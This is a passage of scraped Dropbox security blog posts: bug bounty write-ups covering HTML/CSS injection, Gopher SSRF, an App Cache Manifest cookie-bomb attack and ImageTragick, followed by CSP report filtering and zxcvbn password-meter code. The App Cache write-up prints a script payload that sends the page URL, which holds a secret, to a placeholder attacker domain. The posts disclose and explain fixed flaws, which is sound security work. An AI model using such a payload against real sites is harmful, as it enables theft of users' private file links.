cache-money created a user with the name <h1>First Name</h1> and shared a paper document with 0xacb. They immediately noticed that in the Dropbox web client notifications that the user’s name rendered as “First Name” in a large, bold font. This indicated that HTML injection was possible but with our CSP and use of DOMPurify in our notifications, there was a significant barrier preventing them from escalating to XSS. After some additional investigation, we discovered that it was possible to get this behavior to trigger on the Desktop client as well. Members from both the Product Security team as well as the bug bounty hunters spent some time trying to escalate this HTML injection into something more impactful. We concluded that the CSP rules used in the Desktop environment are too restrictive to allow for more interesting attacks. Moving back to the web client, we realized that DOMPurify was allowing <style> tags through in the default configuration. This means that an attacker could reapply styles on the page making it look however they want. Unfortunately, another big problem with exploitation was a limit on the number of characters allowed in the first and last name fields. Normally, an attacker can leverage CSS injection to exfiltrate sensitive tokens (like a CSRF token) from the page using selectors; however, the payload needed to perform this kind of attack usually requires hundreds of characters, not 80. After some brainstorming, we independently rediscovered a technique using an “ at-rule ” in CSS called @import ( originally documented by sirdarckcat ) which allowed us to exfiltrate tokens from the page using just CSS and a payload that was well under the 80 character limit imposed. Now, all an attacker had to do was create a team, create a user with the payload as their first and last name, and then share a Paper document with a victim. If the victim opened their notifications, it would allow the attacker to exfiltrate the urls of Paper documents present on the page. We fixed the vulnerability the day of the H1-65 Live Hacking event and paid 0xacb and cache-money $12,167 for their report. We also awarded an additional $1,000 bonus for having the “Coolest Proof of Concept” out of all of the submissions. 3. Gopher SSRF HackerOne Report by mlitchfield Modern web applications often have to make requests from the server to external, third-party services to transmit and receive relevant information. Whether that be to send a notification to a developer’s webhook, read information from an external API, or to fetch a file from a remote address. This functionality, however, can also come at a great cost. Improperly configured and mitigated, this feature can quickly turn into a vulnerability called Server-Side Request Forgery (SSRF). Server-Side Request Forgery occurs when an attacker has the ability to issue or redirect a request issued by the server into a sensitive location, often internal. The impact of SSRF ranges variably, but can lead to Remote Code Execution if unchecked. A general mitigation for this class of attack, and the one that we commonly use here at Dropbox, is leveraging HTTP proxy servers for all server-side externally bound requests. If properly configured, the proxies will prevent requests from going to addresses that you deem sensitive like internal IPs or a metadata service. The problem with HTTP proxies, though, is that they’re usually only meant to handle HTTP and HTTPS traffic. That means if your server starts talking a protocol that isn’t HTTP-based, you can quickly find yourself beyond the help of your proxies. Unfortunately for us, Dropbox often uses libcurl to make network requests which supports dozens of different protocols, not just HTTP and HTTPS. In the case of HackerOne report 139572, bug bounty participant Mark Litchfield discovered that by returning a 302 redirect to the request issued by Dropbox from our Saver API, that he was able to switch to an esoteric protocol called Gopher ). Because Gopher is not HTTP-based, the request did not go to our configured proxies allowing him the ability to hit internal services. Mitigation for this vulnerability was not as straight-forward as preventing redirects and disabling bad protocols at the app-layer. This could affect other places we make outbound requests in the future, too. To make our mitigation robust, we looked at all of the available protocols in libcurl and manually patched out all of the protocols we did not need to support. By approaching the mitigation this way, we have future-proofed ourselves from having this kind of problem in the future. For the excellent work and great report written by Mark, which we received well before we raised our bounties , we awarded $6,859. 2. App Cache Manifest HackerOne Report by fransrosen Making a secure platform to store, share, and collaborate on files is a deceptively hard problem. Dropbox has to handle any kind of file you can throw at it while ensuring the safety of everyone else using the platform. We also want to avoid compromising the experience of working with these files as much as possible, so sanitizing a file when a user fetches it is generally off-the-table to avoid manipulating the contents and integrity of the file. One of our main mitigations to attacks like XSS ) is origin isolation. That is, we use an entirely separate origin ( dropboxusercontent.com ) to serve file contents, which often includes when we render files via iframe in the web client. By separating out the origin that we serve our file contents, we avoid needing to do any sanitization of the content and are able to serve back the raw bytes of the file. Even if the file was a malicious XSS payload, the XSS would execute in a useless origin, protecting unsuspecting victims from potential compromise. Unfortunately, Frans discovered in early 2016 that this wasn’t entirely true. Using a lesser-known HTML feature called App Cache Manifest, Frans discovered a chain that could allow an attacker to steal raw file contents of unsuspecting users by merely sending them a link. Before we get into the details of how this attack worked, let’s talk briefly about what an App Cache Manifest is. An App Cache Manifest is a file that describes what files a browser should cache locally for improved performance and experience. A webpage can mark itself as having an App Cache Manifest via an attribute, manifest, on the html tag at the top of the document. The browser will, based on the directives in the manifest, fetch and store any files necessary to comply with the manifest. One important note about the App Cache Manifest is the FALLBACK directive. FALLBACK tells the browser what asset to load from the cache if a particular resource is unavailable. It’s important to note that this is not a redirect (the url of the page will not change), the browser will just serve up different contents instead of the original asset. Now that we know what an App Cache Manifest is for, we can discuss the attack in detail. An attacker would upload an App Cache Manifest (manifest.txt) to the public folder with a FALLBACK directive that instructs the browser to load fallback.xml. An attacker would also **upload an html file, containing a Cookie Bomb payload, to their public Dropbox folder using an extension of .xml (we blocked rendering of .html and .htm files using the Content-Disposition: attachment header). This html page points a manifest html attribute at the file we previously uploaded manifest.txt. The point of the Cookie Bomb attack is to ensure that subsequent loads of https://dropboxusercontent.com will fail due to the sheer amount of cookies being sent. Lastly, the attacker would upload fallback.xml to their public folder containing a payload similar to the following: Copy <html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n     <script>\r\n         <![CDATA[\r\n                var my_img = document.createElement('img');\r\n                my_img.src = \"https://ATTACKER-DOMAIN?url=\" + escape(location.href); // ab4ced3\r\n            ]]>\r\n        </script>\r\n </html> The attacker would then trick a victim into visiting https://dl.dropboxusercontent.com/u/12345678/payload.xml or via a shared link so the user is viewing the file via our web client. The browser would then fetch the manifest marked by the manifest attribute in the payload.xml page. Then the browser fetches any of the assets marked in the manifest, including those under the FALLBACK directive. After these files are fetched, the browser would begin processing the javascript and filling up its cookie jar for the dl.dropboxusercontent.com domain. Any time the victim’s browser tried fetching from dl.dropboxusercontent.com in the future, the request would fail due to the previous Cookie Bomb attack. Upon failure, the App Cache Manifest’s FALLBACK directive would kick in. It would silently load the content of the fallback page from the local cache instead of the remote asset. The fallback javascript payload would grab the current url, which contained a secret, and send the page address to the attacker so they could fetch the content themselves. The attack presented in Frans Rosen’s App Cache Manifest report It’s quite a complicated attack, but very effective. Mitigating this was no easy task either. It’s not quite as simple as sanitizing the javascript or blocking uploads of App Cache Manifest files. We use the following approaches as a holistic solution to our App Cache Manifest woes: We extended our disabled rendering protection to additional file types on the domain by setting Content-Disposition: attachment We isolated origins by using a CSP sandbox directive alongside allow-scripts Later, we added a defense-in-depth measure by ensuring we served our content using randomized subdomains instead of relying on just the CSP origin isolation. Each piece of content is now served on its own, isolated origin which significantly mitigates the risk of this kind of attack. For this incredible report, we awarded Frans $10,648 for his finding. We also awarded a $2,197 bonus commemorating their report for being one of the top reports we received during that 6 month period. 1. ImageTragick HackerOne report by Stewie In the modern web, image processing is nearly as ubiquitous a task as authentication. From resizing profile photos, adjusting colors, or changing image formats, image processing is either supplementary or fundamental feature of a service that can make or break a user experience. For our Thumbnail and Preview pipeline, image processing is a core part of what makes the experience of quickly finding a particular document so easy. One of the most commonly used libraries to perform image processing is ImageMagick . With support for over 200 image formats and numerous transformations, ImageMagick tries to be a one-stop-shop for all of your image processing needs. Stewie, with further improvements by Nikolay Ermishkin of the Mail.ru security team, discovered a series of vulnerabilities within ImageMagick, dubbed “ ImageTragick .” Of the findings, the more serious entries involve a Remote Code Execution (RCE), SSRF, and Local File Inclusion (LFI) allowing an attacker plenty of ways to go about attacking a vulnerable target. The attack primarily leverages an esoteric file format called “MVG” or Magick Vector Graphics. MVG, similar to SVG, leverages instructions that tell the image processor how to construct the vectorized image as opposed to including the raw image data in the file. Unfortunately, some of the instructions, as well as their implementations in ImageMagick, allow for exploitation if mitigations are not in place. ImageTragick would have been the stuff of nightmares for many security teams back in 2016; however, this story has a happy ending for Dropbox. While we were vulnerable to ImageTragick, as Stewie pointed out in report 133377, our robust jailing infrastructure was able to mitigate a majority of the impact. Even the RCE variant of ImageTragick was not enough to cause us much worry as our jails limit network connectivity, access to other users’ files, and even which syscalls can be invoked. By leveraging solid isolation practices, we’ve been able to mitigate most of the risk from running unsafe and untrusted binaries like ImageMagick, xmlsec, and even LibreOffice. Even though the risk to Dropbox was minimal, we awarded $729 for the finding and gave an additional $512 for providing the mitigation to this 0-day. Conclusion At Dropbox, we value the relationships we continue to build with the security researcher community. We strive to attract the top bug hunting talent in the world. There are many friendly bug bounty reporters out there dedicated to finding vulnerabilities. With their help, it keeps the vulnerabilities out of the bad actors hands. After crossing the $1 million payout threshold, Dropbox is going to keep working towards the next million and beyond. These five bugs discussed are just a few examples that validated the diligent work and impact of the Dropbox Security team, revealed how different risks can manifest from multiple directions, and helped make Dropbox a safer and more secure platform. Special thanks to Nathanial Lattimer aka @ d0nut If you have an interest in making Dropbox a safer platform, please feel free to check out the open roles in Security . // Tags Security Bug Bounty Program hackerone // Copy link Link copied Link copied", "date": "2020-02-03"},
{"website": "Dropbox", "title": "Dropbox Bug Bounty Program: Best Practices", "author": ["Chris Peterson"], "link": "https://dropbox.tech/security/dropbox-bug-bounty-program-best-practices-2", "abstract": "Dropbox is recognizing security researchers for submitting security bugs through a bug bounty program with HackerOne and Bugcrowd . Whether you’re a security bug guru or a complete newbie, we want to make it as easy as possible to submit any bugs you find! To this end, we’ve compiled the top 5 security bug report tips from our very own Security Engineers: Build a stronger report by including information on the actual and potential impact of the vulnerability, as well as details of how it could be exploited. Include the methodology you used to find the bug, and the steps to reproduce it. Please submit your results only after you’ve ensured that your bug is verified. Submit the report in your native language if you don’t feel comfortable submitting it in English. Make sure that you gain reputation ! If you're wondering what a good bug report looks like, here's an example: https://hackerone.com/reports/56828 This report has a clear and concise bug description. The impact of the bug is highlighted and includes actual/potential impact, and it has step-by-step instructions on how to reproduce the vulnerability. Including these details will help make your bug report as useful as possible to us, and increase the chances of us using your report. // Tags Security Bug Bounty Program // Copy link Link copied Link copied", "date": "2015-08-31"},
{"website": "Dropbox", "title": "[CSP] On Reporting and Filtering", "author": ["Devdattaakhawe"], "link": "https://dropbox.tech/security/on-csp-reporting-and-filtering", "abstract": "This is the first of four posts on our experience deploying Content Security Policy at Dropbox. If this sort of work interests you, we are hiring ! We will also be at AppSec USA this week. Come say hi! At Dropbox, we are big fans of Content Security Policy or CSP. For those not familiar with the specification, I recommend reading Mike West’s excellent introduction to CSP . A quick recap: at its core, CSP is a declarative mechanism to whitelist content sources (such as sources for scripts, objects, images) in a web application. Setting a CSP policy mitigates injection risk in the web application by limiting content sources. For example, here’s the script-src directive in the content security policy for a request I made to the Dropbox homepage: Copy script-src https://www.google.com/recaptcha/api/\r\nhttps://ajax.googleapis.com/ajax/libs/jquery/  \r\nhttps://cf.dropboxstatic.com/static/api/\r\nhttps://cf.dropboxstatic.com/static/javascript/  \r\nhttps://cf.dropboxstatic.com/static/coffee/compiled/\r\nhttps://www.dropboxstatic.com/static/javascript/ \r\nhttps://www.dropboxstatic.com/static/coffee/ \r\n'unsafe-eval' 'self' 'unsafe-inline' 'nonce-w+NfAhVZiaXzHT1RmBqS' The directive lists all the trusted URIs (including the full path for browsers supporting it) where we could possibly load script code from. When a web browser supporting CSP sees a script tag, it checks the src attribute and matches it against the whitelist provided by the script-src directive of the CSP policy. If the script source is not included in the whitelist (maybe because of HTML injection), the browser will block the request. The Dropbox CSP policy provides a strong mitigation against XSS and content injection attacks. But deploying a strong CSP policy at scale has a number of challenges. We hope that this four-part series sharing lessons we learnt provides value to the broader community. Today’s post discusses how to setup a report filtering pipeline to identify errors in the policy; in the second post, we will discuss how we deployed nonces and mitigated the ‘unsafe-inline’ in the policy above. In the third post, we will discuss our efforts to mitigate the risk from ‘unsafe-eval’, including open-sourcing patches we wrote. Finally, we will discuss how we reduced the risk of third-party integrations with privilege separation. Filtering CSP Violation Reports Identifying and enforcing a CSP header for a modern, complex web application is a difficult task. Thankfully, Content-Security Policy supports a trick to help you roll it out: report-only mode. The key trick behind report-only mode is allowing a website to test out policies and see their impact via violation reports sent to an endpoint of the policy author’s choosing. For example, you could just set a report-only policy of script-src ‘none’ to learn all the places you include scripts from. Report-only mode holds great promise for deploying CSP: you keep iterating on the policy in report-only mode till you hit a point of no violation reports and then flip the switch to enforcement. This is often the recommended first step before turning on CSP in enforcement mode. Similarly, at a recent event I attended, the panel on adopting modern security mechanisms stressed how the CSP report-only mode can provide a useful crutch to deploying CSP, allowing you to evaluate possible policies before deploying them in enforcement mode. This is true: CSP reporting is an irreplaceable tool for getting actionable feedback on deployed policies. At Dropbox, we deployed CSP in report-only mode for months before flipping the switch and going to \"block\" mode. But, at scale, one of the first lessons of deploying CSP is the sheer noise in the reports that make the default report mechanism unusable. We found the biggest source of noise to be browser extensions that insert scripts into the page and/or other programs that might modify the HTML of your page. Recall that CSP blocks any unknown content from running on your page, so content injected into the page will likely get blocked by the browser too. If we just log all the reports that reach us, the logs will contain these errors too. Since you don’t have any control over these extensions, the end goal of “no more violation reports” mentioned above is unreachable. Given our experience deploying CSP at scale, we have over the last year fine-tuned a filtering mechanism to ignore common false-positive violation reports. Our reporting pipeline filters out these reports before logging them to our analytics backend. In the spirit of encouraging adoption of CSP, we are sharing these filtering techniques and hope that you find them useful. The list started off from Neil Matatall’s brilliant, detailed list that we strongly recommend reading too. At first glance, filtering violation reports sounds weird. Why would you not want to know when ad-injectors and spammers are modifying your web application? But, recall that we are talking about the pre-rollout phase of CSP. At this stage, the focus is on making sure that the CSP content whitelist isn’t breaking the web application. Filtering out the noise lets you focus on places where CSP enforcement might be a breaking change and fix appropriately. Once you enable CSP enforcement, the browser will block all the loads in the filtered list anyhow. The filtering is two fold: first, we filter based on the URI scheme of the blocked URIs. Copy _ignored_blockedURI_schemas = [\r\n\"http:\",# We never use HTTP content so not a legit report\r\n\"mxaddon-pkg\",# maxthon addon packages\r\n\"jar:\",# firefox addons\r\n\"file:\",#we never insert file URIs into the page\r\n\"tmtbff://\",# ticketmaster toolbar?\r\n\"safari\",# safari extensions\r\n\"chrome\",# stuff like chromenull: chrome:// chrome-extension://\r\n\"webviewprogressproxy:\",# added by browsers in webviews\r\n\"mbinit:\",# MapBuilder\r\n\"symres:\",# Norton\r\n\"resource\",\r\n]; If the scheme of the blocked URI starts with any of the members of this list, we ignore it. The second step of the filtering looks at the host component of blocked URIs Copy _ignored_blockedURI_hosts=[\r\n\"tlscdn\",\r\n\".superfish.com\", \r\n\"addons.mozilla.org\", \r\n\"v.zilionfast.in\",\r\n\"widgets.amung.us\",\r\n\"xls.searchfun.in\",\r\n\"static.image2play.com\",\r\n\"localhost\",\r\n\"127.0.0.1\",\r\n\"guzzlepraxiscommune\",\r\n\"tfxiq\",\r\n\"akamaihd.net\", #Dropbox doesn't use Akamai CDN\r\n\"apollocdn\",\r\n\"worldssl.net\",\r\n\"shwcdn.net\",\r\n\"cmptch.com\",\r\n\"datafastguru.info\",\r\n\"eshopcomp.com\",\r\n\"hwcdn.net\",\r\n] If the host component of a blocked URI contains any of the keywords above, our filtering code would not log the violation report. Of course, before using this list, you should confirm that you are not legitimately using any of the domains in the list on your own website. Another source of noise we observed was extensions modifying the CSP policy we deliver. To ignore such errors, we also filter based on the violated directive field. If the violated directive field contains either “http:\" or “:443\", we filter the report since we never include these in our policy. One trick we have considered doing is adding a hash of the current policy in the report URI and then only accepting the report if the policy in the violation report matches the hash in the URI. But, we haven't felt the need to try this yet. Thanks to all the Dropboxers, in particular members of the security engineering team who helped me through this process of CSP deployment and report filtering. Additionally, thanks to everyone who reviewed an early version of this blog post. // Tags Security Content Security Policy // Copy link Link copied Link copied", "date": "2015-09-21"},
{"website": "Dropbox", "title": "zxcvbn: realistic password strength estimation", "author": ["Dan Wheeler"], "link": "https://dropbox.tech/security/zxcvbn-realistic-password-strength-estimation", "abstract": "Installation The model Minimum entropy search Threat model: entropy to crack time Entropy calculation Pattern matching Data Conclusion UPDATE: please see our 2016 USENIX Security paper and presentation . Over the last few months, I've seen a password strength meter on almost every signup form I've encountered. Password strength meters are on fire. Here's a question: does a meter actually help people secure their accounts? It's less important than other areas of web security, a short sample of which include: Preventing online cracking with throttling or CAPTCHAs. Preventing offline cracking by selecting a suitably slow hash function with user-unique salts. Securing said password hashes. With that disclaimer — yes. I'm convinced these meters have the potential to help. According to Mark Burnett's 2006 book, Perfect Passwords: Selection, Protection, Authentication , which counted frequencies from a few million passwords over a variety of leaks, one in nine people had a password in this top 500 list . These passwords include some real stumpers: password1, compaq, 7777777, merlin, rosebud. Burnett ran a more recent study last year, looking at 6 million passwords, and found an insane 99.8% occur in the top 10,000 list, with 91% in the top 1,000. The methodology and bias is an important qualifier — for example, since these passwords mostly come from cracked hashes, the list is biased towards crackable passwords to begin with. These are only the really easy-to-guess passwords. For the rest, I'd wager a large percentage are still predictable enough to be susceptible to a modest online attack. So I do think these meters could help, by encouraging stronger password decisions through direct feedback. But right now, with a few closed-source exceptions, I believe they mostly hurt. Here's why. Strength is best measured as entropy, in bits: it's the number of times a space of possible passwords can be cut in half. A naive strength estimation goes like this: Copy # n: password length\r\n# c: password cardinality: the size of the symbol space\r\n#    (26 for lowercase letters only, 62 for a mix of lower+upper+numbers)\r\nentropy = n * lg(c) # base 2 log This brute-force analysis is accurate for people who choose random sequences of letters, numbers and symbols. But with few exceptions (shoutout to 1Password / KeePass ), people of course choose patterns — dictionary words, spatial patterns like qwerty , asdf or zxcvbn , repeats like aaaaaaa , sequences like abcdef or 654321 , or some combination of the above. For passwords with uppercase letters, odds are it's the first letter that's uppercase. Numbers and symbols are often predictable as well: l33t speak (3 for e, 0 for o, @ or 4 for a), years, dates, zip codes, and so on. As a result, simplistic strength estimation gives bad advice. Without checking for common patterns, the practice of encouraging numbers and symbols means encouraging passwords that might only be slightly harder for a computer to crack, and yet frustratingly harder for a human to remember. xkcd nailed it: As an independent Dropbox hackweek project, I thought it’d be fun to build an open source estimator that catches common patterns, and as a corollary, doesn’t penalize sufficiently complex passphrases like correcthorsebatterystaple. It’s now live on dropbox.com/register and available for use on github. Try the demo to experiment and see several example estimations. The table below compares zxcvbn to other meters. The point isn’t to dismiss the others — password policy is highly subjective — rather, it’s to give a better picture of how zxcvbn is different. qwER43@! Tr0ub4dour&3 correcthorsebatterystaple zxcvbn Dropbox (old) Citibank Bank of America (not allowed) (not allowed) (not allowed) Twitter PayPal eBay (not allowed) Facebook Yahoo! Gmail A few notes: I took these screenshots on April 3rd, 2012. I needed to crop the bar from the gmail signup form to make it fit in the table, making the difference in relative width more pronounced than on the form itself . zxcvbn considers correcthorsebatterystaple the strongest password of the 3. The rest either consider it the weakest or disallow it. (Twitter gives about the same score for each, but if you squint, the scores are slightly different.) zxcvbn considers qwER43@! weak because it's a short QWERTY pattern. It adds extra entropy for each turn and shifted character. The PayPal meter considers qwER43@! weak but aaAA11!! strong. Speculation, but that might be because it detects spatial patterns too. Bank of America doesn't allow passwords over 20 characters, disallowing correcthorsebatterystaple . Passwords can contain some symbols, but not & or ! , disallowing the other two passwords. eBay doesn't allow passwords over 20 characters either. Few of these meters appear to use the naive estimation I opened with; otherwise correcthorsebatterystaple would have a high rating from its long length. Dropbox used to add points for each unique lowercase letter, uppercase letter, number, and symbol, up to a certain cap for each group. This mostly has the same only-works-for-brute-force problem, although it also checked against a common passwords dictionary. I don't know the details behind the other meters, but a scoring checklist is another common approach (which also doesn't check for many patterns). I picked Troubadour to be the base word of the second column, not Troubador as occurs in xkcd, which is an uncommon spelling. Installation zxcvbn has no dependencies and works on ie7+/opera/ff/safari/chrome. The best way to add it to your registration page is: Copy <script type=\"text/javascript\" src=\"zxcvbn-async.js\">\r\n</script> zxcvbn-async.js is a measly 350 bytes. On window.load, after your page loads and renders, it'll load zxcvbn.js, a fat 680k (320k gzipped), most of which is a dictionary. I haven't found the script size to be an issue; since a password is usually not the first thing a user enters on a signup form, there's plenty of time to load. zxcvbn adds a single function to the global namespace: Copy zxcvbn(password, user_inputs) It takes one required argument, a password, and returns a result object. The result includes a few properties: Copy result.entropy            # bits\r\nresult.crack_time         # estimation of actual crack time, in seconds.\r\nresult.crack_time_display # same crack time, as a friendlier string:\r\n                          # \"instant\", \"6 minutes\", \"centuries\", etc.\r\nresult.score              # 0, 1, 2, 3 or 4 if crack time is less than\r\n                          # 10**2, 10**4, 10**6, 10**8, Infinity.\r\n                          # (helpful for implementing a strength bar.)\r\nresult.match_sequence     # the detected patterns used to calculate entropy.\r\nresult.calculation_time   # how long it took to calculate an answer,\r\n                          # in milliseconds. usually only a few ms. The optional user_inputs argument is an array of strings that zxcvbn will add to its internal dictionary. This can be whatever list of strings you like, but it's meant for user inputs from other fields of the form, like name and email. That way a password that includes the user's personal info can be heavily penalized. This list is also good for site-specific vocabulary. For example, ours includes dropbox . zxcvbn is written in CoffeeScript. zxcvbn.js and zxcvbn-async.js are unreadably closure -compiled, but if you'd like to extend zxcvbn and send me a pull request, the README has development setup info. The rest of this post details zxcvbn's design. The model zxcvbn consists of three stages: match, score, then search. match enumerates all the (possibly overlapping) patterns it can detect. Currently zxcvbn matches against several dictionaries (English words, names and surnames, Burnett's 10,000 common passwords), spatial keyboard patterns (QWERTY, Dvorak, and keypad patterns), repeats (aaa), sequences (123, gfedcba), years from 1900 to 2019, and dates (3-13-1997, 13.3.1997, 1331997). For all dictionaries, match recognizes uppercasing and common l33t substitutions. score calculates an entropy for each matched pattern, independent of the rest of the password, assuming the attacker knows the pattern. A simple example: rrrrr. In this case, the attacker needs to iterate over all repeats from length 1 to 5 that start with a lowercase letter: Copy entropy = lg(26*5) # about 7 bits search is where Occam's razor comes in. Given the full set of possibly overlapping matches, search finds the simplest (lowest entropy) non-overlapping sequence. For example, if the password is damnation , that could be analyzed as two words, dam and nation , or as one. It's important that it be analyzed as one, because an attacker trying dictionary words will crack it as one word long before two. (As an aside, overlapping patterns are also the primary agent behind accidentally tragic domain name registrations, like childrens-laughter.com but without the hyphen.) Search is the crux of the model. I'll start there and work backwards. Minimum entropy search zxcvbn calculates a password's entropy to be the sum of its constituent patterns. Any gaps between matched patterns are treated as brute-force \"patterns\" that also contribute to the total entropy. For example: Copy entropy(\"stockwell4$eR123698745\") == surname_entropy(\"stockwell\") +\r\n                                     bruteforce_entropy(\"4$eR\") +\r\n                                     keypad_entropy(\"123698745\") That a password's entropy is the sum of its parts is a big assumption. However, it's a conservative assumption. By disregarding the \"configuration entropy\" — the entropy from the number and arrangement of the pieces — zxcvbn is purposely underestimating, by giving a password's structure away for free: It assumes attackers already know the structure (for example, surname-bruteforce-keypad ), and from there, it calculates how many guesses they'd need to iterate through. This is a significant underestimation for complex structures. Considering correcthorsebatterystaple, word-word-word-word , an attacker running a program like L0phtCrack or John the Ripper would typically try many simpler structures first, such as word , word-number , or word-word , before reaching word-word-word-word . I'm OK with this for three reasons: It's difficult to formulate a sound model for structural entropy; statistically, I don't happen to know what structures people choose most, so I'd rather do the safe thing and underestimate. For a complex structure, the sum of the pieces alone is often sufficient to give an \"excellent\" rating. For example, even knowing the word-word-word-word structure of correcthorsebatterystaple, an attacker would need to spend centuries cracking it. Most people don't have complex password structures. Disregarding structure only underestimates by a few bits in the common case. With this assumption out of the way, here's an efficient dynamic programming algorithm in CoffeeScript for finding the minimum non-overlapping match sequence. It runs in O(n·m) time for a length- n password with m (possibly overlapping) candidate matches. Copy # matches: the password's full array of candidate matches.\r\n# each match has a start index (match.i) and an end index (match.j) into\r\n# the password, inclusive.\r\nminimum_entropy_match_sequence = (password, matches) ->\r\n  # e.g. 26 for lowercase-only\r\n  bruteforce_cardinality = calc_bruteforce_cardinality password\r\n  up_to_k = []      # minimum entropy up to k.\r\n  backpointers = [] # for the optimal sequence of matches up to k,\r\n                    # holds the final match (match.j == k).\r\n                    # null means the sequence ends w/ a brute-force char\r\n  for k in [0...password.length]\r\n    # starting scenario to try to beat:\r\n    # adding a brute-force character to the minimum entropy sequence at k-1.\r\n    up_to_k[k] = (up_to_k[k-1] or 0) + lg bruteforce_cardinality\r\n    backpointers[k] = null\r\n    for match in matches when match.j == k\r\n      [i, j] = [match.i, match.j]\r\n      # see if minimum entropy up to i-1 + entropy of this match is less\r\n      # than the current minimum at j.\r\n      candidate_entropy = (up_to_k[i-1] or 0) + calc_entropy(match)\r\n      if candidate_entropy < up_to_k[j]\r\n        up_to_k[j] = candidate_entropy\r\n        backpointers[j] = match\r\n \r\n  # walk backwards and decode the best sequence\r\n  match_sequence = []\r\n  k = password.length - 1\r\n  while k >= 0\r\n    match = backpointers[k]\r\n    if match\r\n      match_sequence.push match\r\n      k = match.i - 1\r\n    else\r\n      k -= 1\r\n  match_sequence.reverse()\r\n \r\n  # fill in the blanks between pattern matches with bruteforce \"matches\"\r\n  # that way the match sequence fully covers the password:\r\n  # match1.j == match2.i - 1 for every adjacent match1, match2.\r\n  make_bruteforce_match = (i, j) ->\r\n    pattern: 'bruteforce'\r\n    i: i\r\n    j: j\r\n    token: password[i..j]\r\n    entropy: lg Math.pow(bruteforce_cardinality, j - i + 1)\r\n    cardinality: bruteforce_cardinality\r\n  k = 0\r\n  match_sequence_copy = []\r\n  for match in match_sequence # fill gaps in the middle\r\n    [i, j] = [match.i, match.j]\r\n    if i - k > 0\r\n      match_sequence_copy.push make_bruteforce_match(k, i - 1)\r\n    k = j + 1\r\n    match_sequence_copy.push match\r\n  if k < password.length # fill gap at the end\r\n    match_sequence_copy.push make_bruteforce_match(k, password.length - 1)\r\n  match_sequence = match_sequence_copy\r\n \r\n  # or 0 corner case is for an empty password ''\r\n  min_entropy = up_to_k[password.length - 1] or 0\r\n  crack_time = entropy_to_crack_time min_entropy\r\n \r\n  # final result object\r\n  password: password\r\n  entropy: round_to_x_digits min_entropy, 3\r\n  match_sequence: match_sequence\r\n  crack_time: round_to_x_digits crack_time, 3\r\n  crack_time_display: display_time crack_time\r\n  score: crack_time_to_score crack_time backpointers[j] holds the match in this sequence that ends at password position j , or null if the sequence doesn't include such a match. Typical of dynamic programming, constructing the optimal sequence requires starting at the end and working backwards. Especially because this is running browser-side as the user types, efficiency does matter. To get something up and running I started with the simpler O(2 m ) approach of calculating the sum for every possible non-overlapping subset, and it slowed down quickly. Currently all together, zxcvbn takes no more than a few milliseconds for most passwords. To give a rough ballpark: running Chrome on a 2.4 GHz Intel Xeon, correcthorsebatterystaple took about 3ms on average. coRrecth0rseba++ery9/23/2007staple$ took about 12ms on average. Threat model: entropy to crack time Entropy isn't intuitive: How do I know if 28 bits is strong or weak? In other words, how should I go from entropy to actual estimated crack time? This requires more assumptions in the form of a threat model. Let's assume: Passwords are stored as salted hashes, with a different random salt per user, making rainbow attacks infeasible. An attacker manages to steal every hash and salt. The attacker is now guessing passwords offline at max rate. The attacker has several CPUs at their disposal. Here's some back-of-the-envelope numbers: Copy # for a hash function like bcrypt/scrypt/PBKDF2, 10ms is a safe lower bound\r\n# for one guess. usually a guess would take longer -- this assumes fast\r\n# hardware and a small work factor. adjust for your site accordingly if you\r\n# use another hash function, possibly by several orders of magnitude!\r\nSINGLE_GUESS = .010 # seconds\r\nNUM_ATTACKERS = 100 # number of cores guessing in parallel.\r\n \r\nSECONDS_PER_GUESS = SINGLE_GUESS / NUM_ATTACKERS\r\n \r\nentropy_to_crack_time = (entropy) ->\r\n  .5 * Math.pow(2, entropy) * SECONDS_PER_GUESS I added a .5 term because we're measuring the average crack time, not the time to try the full space. This math is perhaps overly safe. Large-scale hash theft is a rare catastrophe, and unless you're being specifically targeted, it's unlikely an attacker would dedicate 100 cores to your single password. Normally an attacker has to guess online and deal with network latency, throttling, and CAPTCHAs. Entropy calculation Up next is how zxcvbn calculates the entropy of each constituent pattern. calc_entropy() is the entry point. It's a simple dispatch: Copy calc_entropy = (match) ->\r\n  return match.entropy if match.entropy?\r\n  entropy_func = switch match.pattern\r\n    when 'repeat'     then repeat_entropy\r\n    when 'sequence'   then sequence_entropy\r\n    when 'digits'     then digits_entropy\r\n    when 'year'       then year_entropy\r\n    when 'date'       then date_entropy\r\n    when 'spatial'    then spatial_entropy\r\n    when 'dictionary' then dictionary_entropy\r\n  match.entropy = entropy_func match I gave an outline earlier for how repeat_entropy works. You can see the full scoring code on github, but I'll describe two other scoring functions here to give a taste: spatial_entropy and dictionary_entropy. Consider the spatial pattern qwertyhnm. It starts at q, its length is 9, and it has 3 turns: the initial turn moving right, then down-right, then right. To parameterize: Copy s # number of possible starting characters.\r\n  # 47 for QWERTY/Dvorak, 15 for pc keypad, 16 for mac keypad.\r\nL # password length. L >= 2\r\nt # number of turns. t <= L - 1\r\n  # for example, a length-3 password can have at most 2 turns, like \"qaw\".\r\nd # average \"degree\" of each key -- the number of adjacent keys.\r\n  # about 4.6 for QWERTY/Dvorak. (g has 6 neighbors, tilda only has 1.) The space of total possibilities is then all possible spatial patterns of length L or less with t turns or less: (i – 1) choose (j – 1) counts the possible configurations of turn points for a length- i spatial pattern with j turns. The -1 is added to both terms because the first turn always occurs on the first letter. At each of j turns, there’s d possible directions to go, for a total of d j possibilities per configuration. An attacker would need to try each starting character too, hence the s . This math is only a rough approximation. For example, many of the alternatives counted in the equation aren’t actually possible on a keyboard: for a length-5 pattern with 1 turn, “start at q moving left” gets counted, but isn’t actually possible. CoffeeScript allows natural expression of the above: Copy lg = (n) -> Math.log(n) / Math.log(2)\r\n \r\nnPk = (n, k) ->\r\n  return 0 if k > n\r\n  result = 1\r\n  result *= m for m in [n-k+1..n]\r\n  result\r\n \r\nnCk = (n, k) ->\r\n  return 1 if k == 0\r\n  k_fact = 1\r\n  k_fact *= m for m in [1..k]\r\n  nPk(n, k) / k_fact\r\n \r\nspatial_entropy = (match) ->\r\n  if match.graph in ['qwerty', 'dvorak']\r\n    s = KEYBOARD_STARTING_POSITIONS\r\n    d = KEYBOARD_AVERAGE_DEGREE\r\n  else\r\n    s = KEYPAD_STARTING_POSITIONS\r\n    d = KEYPAD_AVERAGE_DEGREE\r\n  possibilities = 0\r\n  L = match.token.length\r\n  t = match.turns\r\n  # estimate num patterns w/ length L or less and t turns or less.\r\n  for i in [2..L]\r\n    possible_turns = Math.min(t, i - 1)\r\n    for j in [1..possible_turns]\r\n      possibilities += nCk(i 